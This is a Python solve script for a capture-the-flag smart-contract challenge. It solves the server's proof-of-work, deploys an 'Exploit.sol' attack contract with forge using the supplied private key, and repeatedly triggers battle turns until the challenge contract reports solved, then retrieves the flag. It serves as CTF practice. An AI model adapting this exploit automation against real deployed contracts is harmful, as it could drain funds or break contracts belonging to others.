import hashlib
import json
import os
import subprocess

from pwn import remote
from web3 import Web3

CHALLENGE_HOST = os.getenv("CHALLENGE_HOST", "localhost")
CHALLENGE_PORT = os.getenv("CHALLENGE_PORT", "31337")

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recvuntil(b"action? ")
r.sendline(b"1")


def solve_pow(r: remote) -> None:
    r.recvuntil(b'sha256("')
    preimage_prefix = r.recvuntil(b'"')[:-1]
    r.recvuntil(b"start with ")
    bits = int(r.recvuntil(b" "))
    for i in range(0, 1 << 32):
        your_input = str(i).encode()
        preimage = preimage_prefix + your_input
        digest = hashlib.sha256(preimage).digest()
        digest_int = int.from_bytes(digest, "big")
        if digest_int < (1 << (256 - bits)):
            break
    r.recvuntil(b"YOUR_INPUT = ")
    r.sendline(your_input)


solve_pow(r)

r.recvuntil(b"uuid:")
uuid = r.recvline().strip()
r.recvuntil(b"rpc endpoint:")
rpc_url = r.recvline().strip().decode().replace("TODO", CHALLENGE_HOST)
r.recvuntil(b"private key:")
private_key = r.recvline().strip().decode()
r.recvuntil(b"your address:")
player_addr = r.recvline().strip().decode()
r.recvuntil(b"challenge contract:")
land_addr = r.recvline().strip().decode()
r.close()

web3 = Web3(Web3.HTTPProvider(rpc_url))

res = subprocess.run(
    [
        "forge",
        "create",
        "src/Exploit.sol:Master",
        "--private-key",
        private_key,
        "--constructor-args",
        land_addr,
        "--value",
        "1ether",
        "--rpc-url",
        rpc_url,
        "--json",
    ],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)
assert res.returncode == 0

master_addr = json.loads(res.stdout)["deployedTo"]
print("master address", master_addr)


def cast_call(addr: str, sig: str) -> str:
    # use cast instead of web3py because it's easier
    res = subprocess.run(
        [
            "cast",
            "call",
            addr,
            sig,
            "--rpc-url",
            rpc_url,
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    return res.stdout.decode().strip()


master_turn = True
for i in range(0, 10000):
    print()
    if cast_call(land_addr, "is_solved()(bool)") == "true":
        print("solved!")
        break
    stage = cast_call(land_addr, "stage()(uint8)")
    indicator = cast_call(master_addr, "indicator()(uint256)")
    print(f"{i=}", "master" if master_turn else "lunarian")
    print(f"stage {stage} indicator {indicator}")
    if master_turn:
        res = subprocess.run(
            [
                "cast",
                "send",
                master_addr,
                "prepareBattle()",
                "--private-key",
                private_key,
                "--rpc-url",
                rpc_url,
                "--json",
                "--gas-limit",
                str(1_000_000),  # to avoid an error in eth_estimateGas
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        number = int(json.loads(res.stdout)["blockNumber"], 16)
        status = json.loads(res.stdout)["status"]
        print("block number", number, "status", status)
        if status == "0x1":
            master_turn = False
    else:
        r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
        r.recvuntil(b"action? ")
        r.sendline(b"3")
        solve_pow(r)
        r.recvuntil(b"uuid please: ")
        r.sendline(uuid)
        r.recvuntil(b"tx status: ")
        tx_status = r.recvline().strip().decode()
        r.recvuntil(b"tx hash: ")
        tx_hash = r.recvline().strip().decode()
        r.close()

        if tx_status == "1":
            master_turn = True

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recv()
r.sendline(b"4")
r.recvuntil(b"uuid please: ")
r.sendline(uuid)
r.recvuntil(b"Here's the flag: \n")
flag = r.recvline().strip()
print(flag)
